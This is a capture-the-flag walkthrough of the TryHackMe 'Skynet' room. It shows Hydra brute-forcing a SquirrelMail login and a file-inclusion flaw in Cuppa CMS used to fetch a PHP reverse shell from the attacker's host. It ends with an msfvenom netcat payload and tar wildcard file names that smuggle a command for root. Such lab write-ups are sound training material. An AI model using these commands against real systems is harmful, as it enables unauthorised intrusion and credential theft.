---
title: TryHackMe Skynet
date: 2020-12-05
categories: [TryHackMe]
thumbnail: /assets/img/thm/skynet/skynet.png
excerpt: We found squirrelmail which we brute-forced with text files found in a SMB share, later found another CMS which had an LFI vulnerability. Then used a cronjob wildcard exploit for PrivEsc. 
tags: [hydra,SMB,LFI,cronjob, wildcard exploit]
---

> A vulnerable Terminator themed Linux machine.

---

## Nmap Results

![nmap](/assets/img/thm/skynet/nmap.png)

We Have a few ports open:

```
Port 22 - OpenSSH 7.2p2
Port 80 - Apache httpd 2.4.18
Port 110 - Dovecot pop3d
Port 139 - Samba smbd 3.X - 4.X
Port 143 - Dovecot imapd
Port 445 - Samba smbd 4.3.11-Ubuntu
```

---

## Website

Let's take a look at the website.
![website](/assets/img/thm/skynet/website.png)

Running dirsearch we have found a few directories of interest:
![dirsearch](/assets/img/thm/skynet/dirsearch.png)

`/admin` we don't have access to, `/squirrelmail` looks interesting though.

![squirrel](/assets/img/thm/skynet/squirrel.png)

We don't have any credentials.

---

## SMB

Enumerating SMB, looks like we have read access to a share called `anonymous`

![smb](/assets/img/thm/skynet/smbmap.png)

Let's connect to the share with anonymous login and have a look around.
`smbclient //<target IP>/anonymous -U "" -N`

![smbclient](/assets/img/thm/skynet/smbclient.png)
Let's get attention.txt, the `books` directory seems to be useless, let's look into `logs`.

![logs](/assets/img/thm/skynet/logs.png)

Contents of attention.txt

![attention](/assets/img/thm/skynet/attention.png)

Contents of `log1.txt` file

```
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```

The rest seem to be empty.

So it looks like we have a potential username of `milesdyson` from `attention.txt` and a list of passwords, let's see if we can't crack his password.

---

## Squirrelmail

### Method 1

Using Hydra:

`hydra -l milesdyson -P log1.txt <target IP> http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect."`

Great! hydra found a password:

`[80][http-post-form] host: 10.10.27.165   login: milesdyson   password: cyborg007haloterminator`

### Method 2
We could have also used BurpSuite for this with the sniper function and using the `log1.txt` as the payload.

![burp](/assets/img/thm/skynet/burp.png)

Capture your login attempt with Burp and send it to intruder. You want to add your payload marker in the `secretkey` spot. The line should look like this: `login_username=§milesdyson§&secretkey=§§§&js_autodetect_results=§1§&just_logged_in=§1§`

Once you have done that, you can go to the `Payloads` tab and under `Payload Options` click `Load...` and select the `log1.txt` file.

You just need to look for a length that's different from the rest:

![burppass](/assets/img/thm/skynet/burppass.png)

---

## Mail

Great so now we have a username and password so let's try them out.`milesdyson:cyborg007haloterminator`

![admin](/assets/img/thm/skynet/admin.png)

Looks like we are in. We have 3 emails in the inbox and the first on is titled `Samba Password reset`, so let's look at that.
The email reads:
>`We have changed your smb password after system malfunction. Password: )s{A&2Z=F^n_E.B`\`

---

## SMB as milesdyson

Great so now we can connect to smb as miledyson with this new password.

login using `smbclient`:

`smbclient //<target IP>/milesdyson -U milesdyson`

`cd notes`
`get important.txt`

`important.txt` reads:
> 1. Add features to beta CMS /45kra24zxs28v3yd
> 2. Work on T-800 Model 101 blueprints
> 3. Spend more time with my wife

---

## Getting into the CMS

I don't think any of us would've found this in any wordlists. `/45kra24zxs28v3yd`.

The directory brought us here:

![45](/assets/img/thm/skynet/45.png)

So let's run dirsearch on this as well:

![dirsearch2](/assets/img/thm/skynet/dirsearch2.png)

Dirsearch found `/administrator`, let's navigate to that and check it out.

This must be the CMS:

![cuppa](/assets/img/thm/skynet/cuppa.png)

Running searchsploit on cuppa, results in a local/remote file inclusion exploit.
`searchsploit cuppa`

![searchsploit](/assets/img/thm/skynet/searchsploit.png)

You can read the file directly with `searchsploit -x exploits/php/webapps/25971.txt` or get the file with the `-m` flag. up to you. 

Anyways, we can append `alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd` and see `passwd` file. Or... according the exploit file, we can upload our own shell with `alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?`

---

## Getting a shell

Great! So with this knowledge, we can set up our php reverse shell:[PHP shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) and our listener, and setup our python server `python3 -m http.server`

The command we can use `curl http://<target IP>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<host IP>:8000/php-reverse-shell.php`

This is like using `wget` for uploading your shell then navigating to were your shell is. So once you execute this and you set up your listener correctly with the port, you used in your PHP shell.

Now we have a shell:

![shell](/assets/img/thm/skynet/user.png)

User flag is in `/home/milesdyson`

---

## Gaining Root

So if you've done [CMESS](https://tryhackme.com/room/cmess) from TryHackMe, you should be familiar with this exploit. We'll be using the wild card exploit.

When we `wget` LinEnum onto the box we can see a cronjob running:

![cron](/assets/img/thm/skynet/cron.png)

the first part means that it updates every minute. So we'll refer back to [this](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/). Looking into `backup.sh`, we can see he `cd` into `/var/www/html` to do his thing. So this is what we'll have to do later for this to work.

Contents of `backup.sh`

```bash
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

We just have to make our payload with `msfvenom`

`msfvenom -p cmd/unix/reverse_netcat lhost=<host IP> lport=8888 R`

Don't forget to setup your listener with your payload port

Then on target box `cd /var/www/html` and run:

```bash
echo "payload from msfvenom" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

Wait a minute and we should have root:

![root](/assets/img/thm/skynet/root.png)

Root flag is in `/root`.